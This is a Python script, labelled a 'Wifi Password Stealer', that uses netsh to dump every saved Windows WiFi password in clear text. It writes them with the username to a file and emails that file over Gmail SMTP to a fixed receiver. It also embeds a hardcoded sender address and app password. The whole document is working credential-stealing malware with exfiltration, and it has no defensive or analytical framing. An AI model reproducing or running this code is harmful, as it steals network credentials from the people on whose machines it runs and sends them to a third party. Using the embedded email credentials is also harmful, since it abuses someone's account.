# Wifi Password Stealer Created By Shail
# This program will save saved WiFi passwords of Windows OS in File named window.txt
from time import time
from os import environ, popen, system
import smtplib
import os
from email.message import EmailMessage




start_time = time()
username = environ.get('USERNAME')
SMTP_SERVER = "smtp.gmail.com"  # ใช้ Gmail SMTP
SMTP_PORT = 587
EMAIL_SENDER = "bbcorn123za@gmail.com"
EMAIL_PASSWORD = "hwdoyuhdpyoufghf"
EMAIL_RECEIVER = "anochaface@gmail.com"

msg = EmailMessage()
msg["Subject"] = "WIFI PASSWORD FROM " + username
msg["From"] = EMAIL_SENDER
msg["To"] = EMAIL_RECEIVER
msg.set_content("WIFI PASSWORD")

data = popen("netsh wlan show profiles").read().split('\n')
profiles = [i.split(': ')[1].replace("\r", '') for i in data if "All User Profile" in i]
passwords = []
for i in profiles:
    result = (popen("netsh wlan show profile " + i + " key=clear").read().split("\n"))
    password = ([i.split(": ")[1].replace('\r', "") for i in result if "Key Content" in i])
    if password:
        passwords.append(password[0])
    else:
        passwords.append("")
end = (list(zip(profiles, passwords)))
wifi = []
for i in end:
    wifi.append("{:<20}|  {}".format(i[0], i[1]))
wifi = '\n'.join(wifi)
if not wifi:
    wifi = "Not Any Wireless Network Found. Ha ha ha!"
end = """----------------------------------------
USERNAME :: {}
{}
----------------------------------------
DONE
----------------------------------------
""".format(username, wifi)
with open("window.txt", 'a') as f:
    f.write(end)
end_time = time()
system("color 0a")


filename = "window.txt"
with open(filename, "rb") as file:
    file_data = file.read()
    file_name = os.path.basename(filename)
    msg.add_attachment(file_data, maintype="application", subtype="octet-stream", filename=file_name)

# ส่งอีเมล
with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()
    server.login(EMAIL_SENDER, EMAIL_PASSWORD)
    server.send_message(msg)

print("ส่งอีเมลสำเร็จ!")
